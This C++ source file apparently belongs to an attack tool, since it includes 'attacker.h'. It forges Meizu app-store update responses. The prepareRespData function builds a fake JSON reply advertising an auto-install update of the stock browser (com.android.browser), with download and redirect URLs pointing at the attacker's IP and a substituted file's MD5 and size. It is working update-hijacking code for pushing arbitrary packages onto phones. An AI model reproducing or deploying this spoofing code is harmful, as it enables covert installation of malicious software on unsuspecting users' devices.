


#include "MeizuUpdate.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int MeizuUpdate::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;

	string vername = "7.3.3";
	int version = 7003003;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=gbk\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{ \"code\":200,\"message\" : \"\",\"redirect\" : \"http://%s/%s\",\"value\" : "
		"[{\"auto_install\":1,\"category_id\" : 1,\"category_name\" : \"ϵͳ����\","
		"\"digest\" : \"%s\",\"evaluate_count\" : 6371,"			//36997e0f003ae2401ca2877bb303c939
		"\"icon\" : \"http://i3.res.meizu.com/fileserver/app_icon/9465/af19c5ecdc23455b8b29e481b3c268bb.png\","
		"\"id\" : 3075887,\"install_time\" : null,\"is_latest_version\" : 0,"
		"\"name\" : \"���������\",\"package_name\" : \"com.android.browser\","
		"\"price\" : 0.00,\"publisher\" : \"����Ƽ�\",\"size\" : %u,\"star\" : 26,"
		"\"update_description\" : \"С����θ����˼������ĺ��õĹ���\r\n\r\n�� �Ż���ҳ���֣��ҵ�������Ѷ������\r\n�� �����ҳ����ʱ�Զ���λԭ��                          \r\n�� ����������ʱ���ָ��ϴη�����ҳ\r\n�� ֧�ּ�ס�˺����룬�´�һ����¼\r\n\r\n�Ͻ����°�~\","
		"\"url\" : \"%s/%s\",\"version_code\" : %u,\"version_create_time\" : 1528536749713,"		///apps/public/detail/3075887
		"\"version_name\" : \"%s\",\"version_patch_md5\" : null,\"version_patch_size\" : null}] }";



	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szip.c_str(), filename.c_str(), m_szmd5, m_filesize,szip.c_str(), filename.c_str(),version,vername.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;

}
